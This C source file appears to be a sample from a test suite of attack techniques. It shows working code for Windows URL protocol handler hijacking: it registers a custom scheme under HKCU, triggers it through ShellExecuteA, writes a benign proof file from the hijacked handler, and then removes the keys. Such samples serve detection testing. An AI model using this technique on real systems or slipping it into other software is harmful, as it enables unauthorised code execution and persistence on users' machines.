// SAMPLE: g2_17 | Custom URL Protocol Handler Registry Hijacking | Group: Execution Hijacking
//
// g2_17_url_protocol.c — Demonstrates custom URL protocol handler hijacking.
//
// Technique:
//   An attacker registers a custom protocol scheme under HKCU\Software\Classes
//   (e.g., c1test://) without requiring administrator privileges.
//   When any application (browser, document, shell) invokes the URL scheme via
//   ShellExecute(), Windows looks up the protocol handler in the registry and
//   launches the attacker's executable, passing the URL as a command-line argument.
//
// Dual-Role Design:
//   Role A (Setup — argc == 1):
//     1. Registers HKCU\Software\Classes\c1test
//     2. Registers HKCU\Software\Classes\c1test\shell\open\command = "<self> \"%1\""
//     3. Triggers invocation via ShellExecuteA("open", "c1test://g2_17_url_protocol/proof", ...)
//     4. Waits for child process (Role B) to write the C1 proof
//     5. Cleans up registry keys and verifies proof file
//
//   Role B (Handler — argc >= 2 && argv[1] starts with "c1test://"):
//     1. Executed by Windows shell as the registered protocol handler
//     2. This IS the hijacked execution path
//     3. Writes C1 proof file and exits
//
// C1 RULE: Proof is written by the protocol handler process (Role B),
//          demonstrating execution via the hijacked protocol handler mechanism.
//
// Compile: x86_64-w64-mingw32-gcc -O2 -o g2_17_url_protocol.exe g2_17_url_protocol.c -ladvapi32 -lshell32

#include "../shared/c1_proof.h"
#include <windows.h>
#include <shellapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define PROTOCOL_NAME "c1test"
#define PROTOCOL_KEY  "Software\\Classes\\" PROTOCOL_NAME
#define COMMAND_KEY   "Software\\Classes\\" PROTOCOL_NAME "\\shell\\open\\command"

/* Helper to delete registry tree under HKCU */
static void cleanup_registry(void) {
    RegDeleteKeyA(HKEY_CURRENT_USER, COMMAND_KEY);
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\" PROTOCOL_NAME "\\shell\\open");
    RegDeleteKeyA(HKEY_CURRENT_USER, "Software\\Classes\\" PROTOCOL_NAME "\\shell");
    RegDeleteKeyA(HKEY_CURRENT_USER, PROTOCOL_KEY);
}

int main(int argc, char *argv[]) {
    /* -------------------------------------------------------------
     * Role B: Launched by Windows Shell as the Protocol Handler
     * ------------------------------------------------------------- */
    if (argc >= 2 && strncmp(argv[1], PROTOCOL_NAME "://", strlen(PROTOCOL_NAME) + 3) == 0) {
        /*
         * HIJACKED EXECUTION PATH:
         * This process was invoked through the registered URL protocol handler.
         * The proof must be written from this context.
         */
        int rc = write_c1_proof("g2_17_url_protocol", "URLProtocolHijack");
        if (rc != 0) {
            fprintf(stderr, "[url_protocol:handler] write_c1_proof failed: %d\n", rc);
            return EXIT_FAILURE;
        }
        return EXIT_SUCCESS;
    }

    /* -------------------------------------------------------------
     * Role A: Setup and Trigger Mechanism
     * ------------------------------------------------------------- */
    char selfPath[MAX_PATH];
    if (!GetModuleFileNameA(NULL, selfPath, MAX_PATH)) {
        fprintf(stderr, "[url_protocol:setup] GetModuleFileNameA failed: %lu\n",
                GetLastError());
        return EXIT_FAILURE;
    }

    /* Ensure sandbox directory exists */
    CreateDirectoryA("C:\\C1_Sandbox", NULL);

    /* Delete any stale proof file from previous runs */
    DeleteFileA(C1_PROOF_PATH);

    /* Build command string: "<selfPath>" "%1" */
    char cmd[MAX_PATH + 16];
    snprintf(cmd, sizeof(cmd), "\"%s\" \"%%1\"", selfPath);

    printf("[url_protocol:setup] Self path: %s\n", selfPath);
    printf("[url_protocol:setup] Registering HKCU protocol handler: %s\n", PROTOCOL_NAME);

    /* Step 1: Create HKCU\Software\Classes\c1test */
    HKEY hProtoKey = NULL;
    LONG lRes = RegCreateKeyExA(
        HKEY_CURRENT_USER,
        PROTOCOL_KEY,
        0, NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_SET_VALUE | KEY_WRITE,
        NULL,
        &hProtoKey,
        NULL);
    if (lRes != ERROR_SUCCESS) {
        fprintf(stderr, "[url_protocol:setup] RegCreateKeyExA(%s) failed: %ld\n",
                PROTOCOL_KEY, lRes);
        return EXIT_FAILURE;
    }

    const char *desc = "URL:c1test Protocol";
    RegSetValueExA(hProtoKey, NULL, 0, REG_SZ, (const BYTE *)desc, (DWORD)(strlen(desc) + 1));
    /* The presence of "URL Protocol" value marks this as a registered protocol */
    RegSetValueExA(hProtoKey, "URL Protocol", 0, REG_SZ, (const BYTE *)"", 1);
    RegCloseKey(hProtoKey);

    /* Step 2: Create HKCU\Software\Classes\c1test\shell\open\command */
    HKEY hCmdKey = NULL;
    lRes = RegCreateKeyExA(
        HKEY_CURRENT_USER,
        COMMAND_KEY,
        0, NULL,
        REG_OPTION_NON_VOLATILE,
        KEY_SET_VALUE | KEY_WRITE,
        NULL,
        &hCmdKey,
        NULL);
    if (lRes != ERROR_SUCCESS) {
        fprintf(stderr, "[url_protocol:setup] RegCreateKeyExA(%s) failed: %ld\n",
                COMMAND_KEY, lRes);
        cleanup_registry();
        return EXIT_FAILURE;
    }

    RegSetValueExA(hCmdKey, NULL, 0, REG_SZ, (const BYTE *)cmd, (DWORD)(strlen(cmd) + 1));
    RegCloseKey(hCmdKey);

    printf("[url_protocol:setup] Protocol handler registered to: %s\n", cmd);

    /* Step 3: Trigger invocation via ShellExecuteA */
    const char *testUrl = PROTOCOL_NAME "://g2_17_url_protocol/proof";
    printf("[url_protocol:setup] Triggering URL: %s\n", testUrl);

    HINSTANCE hInst = ShellExecuteA(NULL, "open", testUrl, NULL, NULL, SW_HIDE);
    if ((INT_PTR)hInst <= 32) {
        fprintf(stderr, "[url_protocol:setup] ShellExecuteA failed with code: %Id\n",
                (INT_PTR)hInst);
        cleanup_registry();
        return EXIT_FAILURE;
    }

    /* Step 4: Wait for the handler process to execute and write proof */
    BOOL proofFound = FALSE;
    for (int i = 0; i < 20; i++) {
        Sleep(250);
        DWORD attr = GetFileAttributesA(C1_PROOF_PATH);
        if (attr != INVALID_FILE_ATTRIBUTES) {
            proofFound = TRUE;
            break;
        }
    }

    /* Step 5: Clean up registry entries */
    cleanup_registry();
    printf("[url_protocol:setup] Registry keys cleaned up.\n");

    if (!proofFound) {
        fprintf(stderr, "[url_protocol:setup] Proof file was not created by handler.\n");
        return EXIT_FAILURE;
    }

    printf("[url_protocol:setup] URL Protocol Hijacking verified — proof confirmed at %s\n",
           C1_PROOF_PATH);
    return EXIT_SUCCESS;
}
